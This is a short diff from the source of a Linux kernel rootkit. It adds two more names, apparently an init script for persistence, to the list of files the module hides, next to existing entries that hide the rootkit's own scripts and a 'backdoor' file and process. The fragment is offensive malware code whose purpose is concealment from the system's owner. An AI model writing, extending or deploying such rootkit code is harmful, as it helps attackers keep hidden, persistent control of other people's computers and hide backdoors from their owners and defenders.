@@ -664,6 +664,8 @@ static int __init my_rootkit_init(void)
 	k_hide_file(&hide_files, "remove_module.ko");
 	k_hide_file(&hide_files, "my_rootkit.sh");
 	k_hide_file(&hide_files, "my_rootkit_init.sh");
+	k_hide_file(&hide_files, "my_rootkit_sh");
+	k_hide_file(&hide_files, "S75my_rootkit");
 	k_hide_file(&hide_files, "backdoor");
 	k_hide_file(&hide_processes, "backdoor");
 
